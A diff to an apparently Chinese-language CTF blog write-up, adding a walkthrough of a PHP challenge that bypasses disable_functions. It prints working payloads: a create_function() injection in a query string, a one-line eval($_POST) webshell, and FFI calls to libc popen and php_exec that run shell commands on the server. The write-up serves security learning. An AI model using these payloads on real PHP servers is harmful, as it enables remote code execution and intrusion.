@@ -446,6 +446,64 @@ echo base64_encode(serialize($a));
 
 默认情况下FFI只会被用于CLI模式下&预加载php脚本，除非设置`ffi.enable=true`，设置之后在webshell就可以直接用蚁剑插件了
 
+### [极客大挑战 2020]Roamphp5-FighterFightsInvincibly
+
+![image-20211204173057497](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173057497.png)
+
+很漂亮的前端，看页面源码有注释的提示
+
+![image-20211204173130852](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204173130852.png)
+
+这个形式，真的是一眼`create_function()`了，看一下phpinfo()，用的还是`create_function()`的注入
+
+```
+?fighter=create_function&fights=&invincibly=;}phpinfo();/*
+```
+
+看下disable_function
+
+```
+system,exec,shell_exec,passthru,proc_open,proc_close,&nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&nbsp;socket_connect,&nbsp;stream_socket_server,&nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&nbsp;posix_getegid,posix_geteuid,posix_getgid,&nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&nbsp;posix_getrlimit,&nbsp;posix_getsid,posix_getuid,posix_isatty,&nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname</td><td class="v">system,exec,shell_exec,passthru,proc_open,proc_close,&nbsp;proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport,&nbsp;syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept,&nbsp;socket_connect,&nbsp;stream_socket_server,&nbsp;stream_socket_accept,stream_socket_client,ftp_connect,&nbsp;ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space,&nbsp;disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd,&nbsp;posix_getegid,posix_geteuid,posix_getgid,&nbsp;posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,&nbsp;posix_getppid,posix_getpwnam,posix_getpwuid,&nbsp;posix_getrlimit,&nbsp;posix_getsid,posix_getuid,posix_isatty,&nbsp;posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid,&nbsp;posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname
+```
+
+直接不用看了，有一吨，肯定得绕过；蚁剑的各种插件都失败，得手动绕，ffi扩展开着
+
+![image-20211204174245283](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204174245283.png)
+
+看到这里`ffi.enable=On`，符合蚁剑插件的应用条件，写个webshell试试
+
+```
+?fighter=create_function&fights=&invincibly=;}eval($_POST[wuhu]);/*
+```
+
+![image-20211204175626714](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204175626714.png)
+
+what's up，竟然没有回显
+
+尝试ping，发现还不出网，不能用curl外带flag
+
+那只能从FFI本身下手了，调用c的popen 用管道读命令执行的结果
+
+```c
+FILE *popen(const char* command,const char* type);
+```
+
+`popen`会调用`fork()`产生子进程，然后从子进程中调用`/bin/sh -c`来执行参数的命令，type有r(read)和w(write)，依照这个值`popen`会建立管道连接到子进程的标准输出设备或写入到子进程的标准输入设备中
+
+```
+?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("void *popen(char*,char*);void pclose(void*);int fgetc(void*);","libc.so.6");$o = $ffi->popen("ls / -lah","r");$d = "";while(($c = $ffi->fgetc($o)) != -1){$d .= str_pad(strval(dechex($c)),2,"0",0);}$ffi->pclose($o);echo hex2bin($d);/*
+```
+
+![image-20211204180626497](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211204180626497.png)
+
+另一种方法是调用php源码中的函数`php_exec()`，当它的参数type为3时对应调用的是`passthru()`函数，其执行命令可以将结果原始输出
+
+```
+?fighter=create_function&fights=&invincibly=;}$ffi = FFI::cdef("int php_exec(int type, char *cmd);");$ffi->php_exec(3,"ls /");/*
+```
+
+但是，这道题在buu复现不了，原因是uuid有32个字符，加上连字符有36位，再加上flag{}有42位，但是/readflag程序只允许读出37个字符，所以最后的5位是读不出来的（辣个唯一解可能是爆破的 我试着爆了一会 加延时得跑好久好久好久 放弃了
+
 ------
 
 最近在刷buuoj，有望这个月内把50解以上的题做完捏
@@ -462,6 +520,6 @@ echo base64_encode(serialize($a));
 
 [Python cffi学习 ](https://www.cnblogs.com/ccxikka/p/9637545.html) |  [cffi-example: an example project showing how to use Python's CFFI](https://github.com/wolever/python-cffi-example)
 
-[wp](https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp)
+[wp](https://mochazz.github.io/2019/05/21/RCTF2019Web%E9%A2%98%E8%A7%A3%E4%B9%8Bnextphp/#nextphp)  |  [wp2](http://www.lshhaisheng.com/2021/08/02/%E7%BB%95%E8%BF%87disable_function/)
 
 {{% /spoiler %}}
